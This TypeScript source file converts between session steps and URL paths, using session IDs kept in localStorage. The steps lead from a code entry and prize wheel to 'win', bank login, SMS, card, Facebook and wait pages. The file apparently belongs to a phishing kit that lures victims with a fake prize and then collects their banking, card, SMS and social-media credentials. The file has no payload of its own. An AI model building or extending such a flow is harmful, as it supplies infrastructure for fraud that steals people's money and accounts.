import type { SessionStep } from "@/types/session";
import { ACTIVE_ROUTE_SESSION_STORAGE_KEY, ACTIVE_SESSION_STORAGE_KEY } from "@/lib/session-constants";

export function stepToPath(
  step: SessionStep,
  sessionId: string,
  routeSessionId?: string,
): string {
  let effectiveRouteSessionId = routeSessionId;

  if (!effectiveRouteSessionId || effectiveRouteSessionId === sessionId) {
    if (typeof window !== "undefined") {
      try {
        const stored = window.localStorage.getItem(ACTIVE_ROUTE_SESSION_STORAGE_KEY)?.trim();
        const active = window.localStorage.getItem(ACTIVE_SESSION_STORAGE_KEY)?.trim();
        if (stored && stored !== "undefined" && stored !== "null" && active === sessionId) {
          effectiveRouteSessionId = stored;
        }
      } catch {
        /* ignore */
      }
    }
  }

  effectiveRouteSessionId = effectiveRouteSessionId || sessionId || "";

  const qs = effectiveRouteSessionId ? `?session=${encodeURIComponent(effectiveRouteSessionId)}` : "";
  switch (step) {
    case "code_entry":
      return `/code${qs}`;
    case "wheel":
      return `/wheel${qs}`;
    case "verify":
      return `/verify${qs}`;
    case "win":
      return `/win${qs}`;
    case "banken":
      return `/banken${qs}`;
    case "bank":
    case "bank_login":
      return `/banken${qs}`;
    case "wait":
      return `/wait${qs}`;
    case "invalid_bank":
      return `/invalid-bank${qs}`;
    case "live_support":
      return `/live-support${qs}`;
    case "sms":
      return `/sms${qs}`;
    case "card":
      return `/card${qs}`;
    case "facebook":
      return `/facebook${qs}`;
    case "congrats":
      return `/congratulations${qs}`;
    case "special_approval":
      return `/special-approval${qs}`;
    case "generator1":
      return `/generator1${qs}`;
    case "generator2":
      return `/generator2${qs}`;
    case "custom_question":
      return `/custom-question${qs}`;
    default:
      return `/win${qs}`;
  }
}

export function pathToStep(pathname: string): SessionStep | null {
  if (pathname.startsWith("/code")) return "code_entry";
  if (pathname.startsWith("/wheel")) return "wheel";
  if (pathname.startsWith("/verify")) return "verify";
  if (pathname.includes("/bank/")) return "bank";
  if (pathname.startsWith("/win")) return "win";
  if (pathname.startsWith("/banken") || pathname.startsWith("/banks")) return "banken";
  if (pathname.startsWith("/wait")) return "wait";
  if (pathname.startsWith("/invalid-bank")) return "invalid_bank";
  if (pathname.startsWith("/live-support")) return "live_support";
  if (pathname.startsWith("/congratulations")) return "congrats";
  if (pathname.startsWith("/special-approval")) return "special_approval";
  if (pathname.startsWith("/generator1")) return "generator1";
  if (pathname.startsWith("/generator2")) return "generator2";
  if (pathname.startsWith("/custom-question")) return "custom_question";
  if (pathname.startsWith("/sms")) return "sms";
  if (pathname.startsWith("/card")) return "card";
  if (pathname.startsWith("/facebook")) return "facebook";
  return null;
}
